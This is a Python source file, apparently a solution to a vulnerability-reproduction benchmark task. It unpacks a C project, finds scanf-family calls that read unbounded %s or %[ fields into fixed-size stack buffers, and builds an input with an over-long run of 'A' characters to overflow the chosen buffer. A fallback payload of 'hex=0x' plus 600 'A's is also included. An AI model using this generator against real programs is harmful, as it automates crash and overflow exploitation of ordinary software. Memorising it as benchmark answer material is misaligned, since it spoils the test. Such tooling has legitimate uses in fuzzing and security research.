import os
import re
import tarfile
import tempfile
import ast
from typing import Dict, Optional, List, Tuple, Any


_TARGET_SCAN_FUNCS = {
    "sscanf": ("sscanf", 2),
    "__isoc99_sscanf": ("sscanf", 2),
    "fscanf": ("fscanf", 2),
    "__isoc99_fscanf": ("fscanf", 2),
    "scanf": ("scanf", 1),
    "__isoc99_scanf": ("scanf", 1),
}

_HEX_HINT_RE = re.compile(r'(?i)\bhex\b|0x|isxdigit|strtol\s*\(|base\s*16|\b[a-f0-9]{8,}\b')
_CFG_HINT_RE = re.compile(r'(?i)\bconf(ig)?\b|\bcfg\b|\bini\b')


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    abs_path = os.path.abspath(path)
    for m in tar.getmembers():
        name = m.name
        if not name:
            continue
        target = os.path.abspath(os.path.join(path, name))
        if not (target == abs_path or target.startswith(abs_path + os.sep)):
            continue
        if m.issym() or m.islnk():
            continue
        tar.extract(m, path)


def _strip_comments_preserve_strings(code: str) -> str:
    n = len(code)
    out = []
    i = 0
    state = 0  # 0 normal, 1 line, 2 block, 3 string, 4 char
    while i < n:
        ch = code[i]
        if state == 0:
            if ch == '/' and i + 1 < n and code[i + 1] == '/':
                out.append(' ')
                out.append(' ')
                i += 2
                state = 1
            elif ch == '/' and i + 1 < n and code[i + 1] == '*':
                out.append(' ')
                out.append(' ')
                i += 2
                state = 2
            elif ch == '"':
                out.append(ch)
                i += 1
                state = 3
            elif ch == "'":
                out.append(ch)
                i += 1
                state = 4
            else:
                out.append(ch)
                i += 1
        elif state == 1:
            if ch == '\n':
                out.append('\n')
                i += 1
                state = 0
            else:
                out.append(' ')
                i += 1
        elif state == 2:
            if ch == '*' and i + 1 < n and code[i + 1] == '/':
                out.append(' ')
                out.append(' ')
                i += 2
                state = 0
            else:
                out.append('\n' if ch == '\n' else ' ')
                i += 1
        elif state == 3:
            out.append(ch)
            if ch == '\\' and i + 1 < n:
                out.append(code[i + 1])
                i += 2
            else:
                i += 1
                if ch == '"':
                    state = 0
        else:
            out.append(ch)
            if ch == '\\' and i + 1 < n:
                out.append(code[i + 1])
                i += 2
            else:
                i += 1
                if ch == "'":
                    state = 0
    return ''.join(out)


def _c_unescape(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    hexd = "0123456789abcdefABCDEF"
    octd = "01234567"
    while i < n:
        ch = s[i]
        if ch != '\\':
            out.append(ch)
            i += 1
            continue
        i += 1
        if i >= n:
            break
        c = s[i]
        if c == 'n':
            out.append('\n')
            i += 1
        elif c == 't':
            out.append('\t')
            i += 1
        elif c == 'r':
            out.append('\r')
            i += 1
        elif c == '\\':
            out.append('\\')
            i += 1
        elif c == '"':
            out.append('"')
            i += 1
        elif c == "'":
            out.append("'")
            i += 1
        elif c == 'a':
            out.append('\a')
            i += 1
        elif c == 'b':
            out.append('\b')
            i += 1
        elif c == 'f':
            out.append('\f')
            i += 1
        elif c == 'v':
            out.append('\v')
            i += 1
        elif c == 'x':
            i += 1
            h = []
            while i < n and len(h) < 2 and s[i] in hexd:
                h.append(s[i])
                i += 1
            if h:
                try:
                    out.append(chr(int(''.join(h), 16)))
                except Exception:
                    pass
        elif c in octd:
            o = [c]
            i += 1
            while i < n and len(o) < 3 and s[i] in octd:
                o.append(s[i])
                i += 1
            try:
                out.append(chr(int(''.join(o), 8)))
            except Exception:
                pass
        else:
            out.append(c)
            i += 1
    return ''.join(out)


def _parse_c_string_literals(expr: str) -> Optional[str]:
    i = 0
    n = len(expr)
    parts = []
    found = False

    def skip_ws(ii: int) -> int:
        while ii < n and expr[ii].isspace():
            ii += 1
        return ii

    i = skip_ws(i)
    while i < n:
        if expr[i] == 'L' and i + 1 < n and expr[i + 1] == '"':
            i += 1
        if i >= n or expr[i] != '"':
            break
        found = True
        i += 1
        start = i
        buf = []
        while i < n:
            ch = expr[i]
            if ch == '\\' and i + 1 < n:
                buf.append(expr[i])
                buf.append(expr[i + 1])
                i += 2
                continue
            if ch == '"':
                break
            buf.append(ch)
            i += 1
        if i >= n or expr[i] != '"':
            return None
        parts.append(_c_unescape(''.join(buf)))
        i += 1
        i = skip_ws(i)

    if not found:
        return None
    if i != n and expr[i:].strip():
        return None
    return ''.join(parts)


def _split_top_level_args(arg_str: str) -> List[str]:
    args = []
    cur = []
    depth_p = 0
    depth_b = 0
    depth_c = 0
    i = 0
    n = len(arg_str)
    state = 0  # 0 normal, 1 string, 2 char
    while i < n:
        ch = arg_str[i]
        if state == 0:
            if ch == '"':
                cur.append(ch)
                state = 1
                i += 1
            elif ch == "'":
                cur.append(ch)
                state = 2
                i += 1
            elif ch == '(':
                depth_p += 1
                cur.append(ch)
                i += 1
            elif ch == ')':
                if depth_p > 0:
                    depth_p -= 1
                cur.append(ch)
                i += 1
            elif ch == '[':
                depth_b += 1
                cur.append(ch)
                i += 1
            elif ch == ']':
                if depth_b > 0:
                    depth_b -= 1
                cur.append(ch)
                i += 1
            elif ch == '{':
                depth_c += 1
                cur.append(ch)
                i += 1
            elif ch == '}':
                if depth_c > 0:
                    depth_c -= 1
                cur.append(ch)
                i += 1
            elif ch == ',' and depth_p == 0 and depth_b == 0 and depth_c == 0:
                args.append(''.join(cur).strip())
                cur = []
                i += 1
            else:
                cur.append(ch)
                i += 1
        elif state == 1:
            cur.append(ch)
            if ch == '\\' and i + 1 < n:
                cur.append(arg_str[i + 1])
                i += 2
            else:
                i += 1
                if ch == '"':
                    state = 0
        else:
            cur.append(ch)
            if ch == '\\' and i + 1 < n:
                cur.append(arg_str[i + 1])
                i += 2
            else:
                i += 1
                if ch == "'":
                    state = 0
    if cur:
        args.append(''.join(cur).strip())
    return args


def _extract_call(code: str, name_start: int) -> Optional[Tuple[int, int, str]]:
    n = len(code)
    i = name_start
    while i < n and (code[i].isalnum() or code[i] == '_'):
        i += 1
    j = i
    while j < n and code[j].isspace():
        j += 1
    if j >= n or code[j] != '(':
        return None
    start_paren = j
    j += 1
    depth = 1
    state = 0  # 0 normal, 1 string, 2 char
    while j < n:
        ch = code[j]
        if state == 0:
            if ch == '"':
                state = 1
                j += 1
            elif ch == "'":
                state = 2
                j += 1
            elif ch == '(':
                depth += 1
                j += 1
            elif ch == ')':
                depth -= 1
                j += 1
                if depth == 0:
                    return start_paren, j, code[start_paren + 1:j - 1]
            else:
                j += 1
        elif state == 1:
            if ch == '\\' and j + 1 < n:
                j += 2
            else:
                j += 1
                if ch == '"':
                    state = 0
        else:
            if ch == '\\' and j + 1 < n:
                j += 2
            else:
                j += 1
                if ch == "'":
                    state = 0
    return None


def _strip_c_number_suffixes(expr: str) -> str:
    expr = re.sub(r'(?<=\d)[uUlL]+', '', expr)
    expr = re.sub(r'(?<=0x[0-9a-fA-F])[uUlL]+', '', expr)
    return expr


def _remove_simple_casts(expr: str) -> str:
    cast_re = re.compile(
        r'\(\s*(?:const\s+)?(?:unsigned\s+)?(?:signed\s+)?(?:long\s+long|long|short|int|char|size_t|ssize_t|uint\d+_t|int\d+_t)\s*(?:\*+\s*)?\)'
    )
    prev = None
    s = expr
    for _ in range(6):
        ns = cast_re.sub('', s)
        if ns == s:
            break
        s = ns
    return s


_ALLOWED_BINOPS = (ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Mod, ast.LShift, ast.RShift, ast.BitOr, ast.BitAnd, ast.BitXor)
_ALLOWED_UNARYOPS = (ast.UAdd, ast.USub, ast.Invert)


def _safe_eval_ast(node: ast.AST) -> int:
    if isinstance(node, ast.Expression):
        return _safe_eval_ast(node.body)
    if isinstance(node, ast.Constant):
        if isinstance(node.value, (int, bool)):
            return int(node.value)
        raise ValueError("bad const")
    if isinstance(node, ast.UnaryOp) and isinstance(node.op, _ALLOWED_UNARYOPS):
        v = _safe_eval_ast(node.operand)
        if isinstance(node.op, ast.UAdd):
            return +v
        if isinstance(node.op, ast.USub):
            return -v
        if isinstance(node.op, ast.Invert):
            return ~v
    if isinstance(node, ast.BinOp) and isinstance(node.op, _ALLOWED_BINOPS):
        a = _safe_eval_ast(node.left)
        b = _safe_eval_ast(node.right)
        if isinstance(node.op, ast.Add):
            return a + b
        if isinstance(node.op, ast.Sub):
            return a - b
        if isinstance(node.op, ast.Mult):
            return a * b
        if isinstance(node.op, ast.FloorDiv):
            if b == 0:
                raise ValueError("div0")
            return a // b
        if isinstance(node.op, ast.Mod):
            if b == 0:
                raise ValueError("mod0")
            return a % b
        if isinstance(node.op, ast.LShift):
            return a << b
        if isinstance(node.op, ast.RShift):
            return a >> b
        if isinstance(node.op, ast.BitOr):
            return a | b
        if isinstance(node.op, ast.BitAnd):
            return a & b
        if isinstance(node.op, ast.BitXor):
            return a ^ b
    raise ValueError("bad ast")


def _eval_c_int_expr(expr: str, macros: Dict[str, int]) -> Optional[int]:
    if expr is None:
        return None
    s = expr.strip()
    if not s:
        return None
    s = _remove_simple_casts(s)
    s = _strip_c_number_suffixes(s)
    s = s.replace('/', '//')
    if 'sizeof' in s:
        return None

    def repl_ident(m: re.Match) -> str:
        name = m.group(0)
        if name in macros:
            return str(macros[name])
        return name

    s2 = re.sub(r'\b[A-Za-z_]\w*\b', repl_ident, s)
    if re.search(r'\b[A-Za-z_]\w*\b', s2):
        return None
    if re.search(r'[^0-9a-fA-FxX\s\+\-\*\/%<>&\|\^\(\)~]', s2):
        return None
    try:
        tree = ast.parse(s2, mode='eval')
        v = _safe_eval_ast(tree)
        if v < 0:
            return None
        return int(v)
    except Exception:
        return None


def _parse_macros_from_text(text: str) -> Dict[str, str]:
    macros: Dict[str, str] = {}
    for line in text.splitlines():
        m = re.match(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$', line)
        if not m:
            continue
        name = m.group(1)
        rhs = m.group(2)
        if '(' in name:
            continue
        if name and '(' in rhs.split(None, 1)[0]:
            continue
        rhs = re.split(r'//|/\*', rhs, 1)[0].strip()
        if not rhs or rhs.endswith('\\'):
            continue
        macros[name] = rhs
    return macros


def _resolve_numeric_macros(expr_macros: Dict[str, str]) -> Dict[str, int]:
    resolved: Dict[str, int] = {}
    unresolved = dict(expr_macros)
    for _ in range(20):
        progress = False
        for k in list(unresolved.keys()):
            v = _eval_c_int_expr(unresolved[k], resolved)
            if v is not None:
                resolved[k] = v
                del unresolved[k]
                progress = True
        if not progress:
            break
    return resolved


def _parse_format_conversions(fmt: str) -> List[Dict[str, Any]]:
    convs = []
    i = 0
    n = len(fmt)
    while i < n:
        if fmt[i] != '%':
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == '%':
            i += 2
            continue
        j = i + 1
        suppressed = False
        if j < n and fmt[j] == '*':
            suppressed = True
            j += 1
        width = None
        wstart = j
        while j < n and fmt[j].isdigit():
            j += 1
        if j > wstart:
            try:
                width = int(fmt[wstart:j])
            except Exception:
                width = None
        if j < n and fmt[j] == '[':
            j += 1
            if j < n and fmt[j] == '^':
                j += 1
            if j < n and fmt[j] == ']':
                j += 1
            while j < n and fmt[j] != ']':
                j += 1
            if j < n and fmt[j] == ']':
                j += 1
            spec = '['
            convs.append({"pos": i, "end": j, "spec": spec, "suppressed": suppressed, "width": width})
            i = j
            continue
        while j < n:
            if fmt[j] in 'hlLjztqI':
                if j + 1 < n and fmt[j:j + 2] in ('hh', 'll'):
                    j += 2
                else:
                    j += 1
                continue
            break
        if j >= n:
            break
        spec = fmt[j]
        j += 1
        convs.append({"pos": i, "end": j, "spec": spec, "suppressed": suppressed, "width": width})
        i = j
    return convs


def _extract_base_ident(arg: str) -> Optional[str]:
    s = arg.strip()
    if not s:
        return None
    for _ in range(5):
        m = re.match(r'^\(\s*[^()]*\)\s*(.*)$', s)
        if not m:
            break
        s = m.group(1).strip()
    s = s.lstrip('&*').strip()
    while s.startswith('(') and s.endswith(')') and len(s) >= 2:
        inner = s[1:-1].strip()
        if inner.count('(') == inner.count(')'):
            s = inner
        else:
            break
    m = re.match(r'^([A-Za-z_]\w*)', s)
    if not m:
        return None
    return m.group(1)


def _parse_char_arrays_from_stmt(stmt: str, numeric_macros: Dict[str, int]) -> Dict[str, int]:
    out: Dict[str, int] = {}
    if 'char' not in stmt:
        return out
    if re.search(r'\bstruct\b|\bunion\b|\benum\b', stmt):
        pass
    m = re.search(r'\b(?:const\s+)?(?:unsigned\s+)?char\b', stmt)
    if not m:
        return out
    for name, expr in re.findall(r'\b([A-Za-z_]\w*)\s*\[\s*([^\]]+?)\s*\]', stmt):
        v = _eval_c_int_expr(expr, numeric_macros)
        if v is None:
            continue
        if 1 <= v <= 1_000_000:
            out[name] = v
    return out


def _construct_input_from_format(fmt: str, vuln_ordinal: int, long_token: str) -> str:
    convs = _parse_format_conversions(fmt)
    ordinal = 0
    out = []
    i = 0
    n = len(fmt)
    conv_iter = iter(convs)
    cur = next(conv_iter, None)

    def token_for(spec: str, suppressed: bool, ordinal_match: bool) -> str:
        if spec == 'n':
            return ''
        if ordinal_match:
            return long_token
        if spec in ('d', 'i', 'u', 'x', 'X', 'o'):
            return '0'
        if spec in ('f', 'e', 'E', 'g', 'G', 'a', 'A'):
            return '0'
        if spec == 'c':
            return 'A'
        if spec in ('p',):
            return '0'
        if spec in ('s', '['):
            return 'X'
        return '0'

    while i < n:
        if cur is not None and cur["pos"] == i:
            spec = cur["spec"]
            suppressed = bool(cur["suppressed"])
            width = cur["width"]
            is_arg = (not suppressed and spec != 'n')
            ordinal_match = False
            if is_arg:
                ordinal_match = (ordinal == vuln_ordinal)
                ordinal += 1
            tok = token_for(spec, suppressed, ordinal_match)
            if tok:
                out.append(tok)
            i = cur["end"]
            cur = next(conv_iter, None)
            continue

        ch = fmt[i]
        if ch.isspace():
            out.append(' ')
            i += 1
            while i < n and fmt[i].isspace():
                i += 1
            continue
        if ch == '\\' and i + 1 < n:
            esc = fmt[i:i + 2]
            if esc == '\\n':
                out.append('\n')
                i += 2
                continue
            if esc == '\\r':
                out.append('\r')
                i += 2
                continue
            if esc == '\\t':
                out.append('\t')
                i += 2
                continue
        out.append(ch)
        i += 1
    s = ''.join(out)
    s = re.sub(r'[ ]{2,}', ' ', s)
    return s


def _scan_source_for_candidates(cleaned: str, file_path: str, numeric_macros: Dict[str, int]) -> List[Dict[str, Any]]:
    candidates: List[Dict[str, Any]] = []
    scopes: List[Dict[str, int]] = [dict()]
    stmt_start = 0
    i = 0
    n = len(cleaned)

    def lookup_size(ident: str) -> Optional[Tuple[int, int]]:
        for depth in range(len(scopes) - 1, -1, -1):
            if ident in scopes[depth]:
                return scopes[depth][ident], depth
        return None

    while i < n:
        ch = cleaned[i]
        if ch == '{':
            scopes.append(dict())
            stmt_start = i + 1
            i += 1
            continue
        if ch == '}':
            if len(scopes) > 1:
                scopes.pop()
            stmt_start = i + 1
            i += 1
            continue
        if ch == ';':
            stmt = cleaned[stmt_start:i + 1]
            decls = _parse_char_arrays_from_stmt(stmt, numeric_macros)
            if decls:
                scopes[-1].update(decls)
            stmt_start = i + 1
            i += 1
            continue

        if ch.isalpha() or ch == '_':
            j = i + 1
            while j < n and (cleaned[j].isalnum() or cleaned[j] == '_'):
                j += 1
            ident = cleaned[i:j]
            if ident in _TARGET_SCAN_FUNCS:
                call = _extract_call(cleaned, i)
                if call is not None:
                    _, end_paren, arg_str = call
                    args = _split_top_level_args(arg_str)
                    kind, fmt_pos = _TARGET_SCAN_FUNCS[ident]
                    fmt_arg_index = fmt_pos - 1
                    if len(args) > fmt_arg_index:
                        fmt_expr = args[fmt_arg_index]
                        fmt = _parse_c_string_literals(fmt_expr)
                        if fmt:
                            convs = _parse_format_conversions(fmt)
                            if kind in ("sscanf", "fscanf"):
                                dest_args = args[fmt_arg_index + 1:]
                            else:
                                dest_args = args[fmt_arg_index + 1:]
                            arg_consuming = []
                            for c in convs:
                                if c["suppressed"]:
                                    continue
                                if c["spec"] == 'n':
                                    continue
                                arg_consuming.append(c)
                            if arg_consuming and dest_args:
                                max_map = min(len(arg_consuming), len(dest_args))
                                window_lo = max(0, i - 200)
                                window_hi = min(n, end_paren + 400)
                                around = cleaned[window_lo:window_hi]
                                around_score = 0
                                if _HEX_HINT_RE.search(around):
                                    around_score += 6
                                if _CFG_HINT_RE.search(around) or _CFG_HINT_RE.search(file_path):
                                    around_score += 2
                                fmt_l = fmt.lower()
                                if 'hex' in fmt_l:
                                    around_score += 4
                                if '0x' in fmt_l:
                                    around_score += 3
                                if '[0-9a-f' in fmt_l or '[^0-9a-f' in fmt_l:
                                    around_score += 2

                                for k in range(max_map):
                                    c = arg_consuming[k]
                                    spec = c["spec"]
                                    width = c["width"]
                                    if spec not in ('s', '['):
                                        continue
                                    if width is not None:
                                        continue
                                    arg = dest_args[k]
                                    base = _extract_base_ident(arg)
                                    if not base:
                                        continue
                                    looked = lookup_size(base)
                                    if not looked:
                                        continue
                                    size, decl_depth = looked
                                    if decl_depth <= 0:
                                        continue
                                    score = around_score
                                    if 'hex' in base.lower():
                                        score += 3
                                    if size <= 8:
                                        score -= 2
                                    candidates.append({
                                        "file": file_path,
                                        "func": ident,
                                        "fmt": fmt,
                                        "vuln_ordinal": k,
                                        "var": base,
                                        "size": size,
                                        "scope_depth": len(scopes) - 1,
                                        "decl_depth": decl_depth,
                                        "score": score,
                                    })
                    i = end_paren
                    continue
            i = j
            continue

        i += 1

    return candidates


def _choose_best_candidate(cands: List[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
    if not cands:
        return None

    def key(c: Dict[str, Any]) -> Tuple[int, int, int, int]:
        score = int(c.get("score", 0))
        decl_depth = int(c.get("decl_depth", 0))
        size = int(c.get("size", 10**9))
        fmt_len = len(c.get("fmt", ""))
        return (-score, -decl_depth, size, fmt_len)

    cands_sorted = sorted(cands, key=key)
    best = cands_sorted[0]

    good = [c for c in cands_sorted[:8] if c.get("score", 0) >= best.get("score", 0) - 2]
    if good:
        good = sorted(good, key=lambda c: (int(c.get("size", 10**9)), -int(c.get("score", 0))))
        return good[0]
    return best


class Solution:
    def solve(self, src_path: str) -> bytes:
        fallback = b"hex=0x" + (b"A" * 600) + b"\n"
        try:
            root = src_path
            tmpdir = None
            if os.path.isfile(src_path):
                tmpdir = tempfile.TemporaryDirectory()
                root = tmpdir.name
                with tarfile.open(src_path, "r:*") as tf:
                    _safe_extract_tar(tf, root)
            elif not os.path.isdir(src_path):
                return fallback

            source_files = []
            for dirpath, dirnames, filenames in os.walk(root):
                dirnames[:] = [d for d in dirnames if d not in ('.git', '.svn', '__pycache__', 'build', 'dist')]
                for fn in filenames:
                    lfn = fn.lower()
                    if lfn.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh')):
                        source_files.append(os.path.join(dirpath, fn))

            if not source_files:
                if tmpdir is not None:
                    tmpdir.cleanup()
                return fallback

            macro_exprs: Dict[str, str] = {}
            file_texts: List[Tuple[str, str]] = []
            for fp in source_files:
                try:
                    with open(fp, "rb") as f:
                        data = f.read()
                    if len(data) > 2_000_000:
                        data = data[:2_000_000]
                    text = data.decode("utf-8", errors="ignore")
                    file_texts.append((fp, text))
                    macro_exprs.update(_parse_macros_from_text(text))
                except Exception:
                    continue

            numeric_macros = _resolve_numeric_macros(macro_exprs)

            candidates: List[Dict[str, Any]] = []
            for fp, text in file_texts:
                try:
                    cleaned = _strip_comments_preserve_strings(text)
                    candidates.extend(_scan_source_for_candidates(cleaned, fp, numeric_macros))
                except Exception:
                    continue

            best = _choose_best_candidate(candidates)
            if best is None:
                if tmpdir is not None:
                    tmpdir.cleanup()
                return fallback

            size = int(best.get("size", 0))
            if size <= 0 or size > 5_000_000:
                if tmpdir is not None:
                    tmpdir.cleanup()
                return fallback

            long_len = size
            if long_len < 32:
                long_len = max(long_len, 64)
            long_token = "A" * long_len

            fmt = best["fmt"]
            vuln_ordinal = int(best["vuln_ordinal"])
            line = _construct_input_from_format(fmt, vuln_ordinal, long_token)

            if '\n' not in line:
                line = line.rstrip() + "\n"

            poc = line.encode("ascii", errors="ignore")
            if not poc.strip():
                poc = fallback

            if tmpdir is not None:
                tmpdir.cleanup()
            return poc
        except Exception:
            return fallback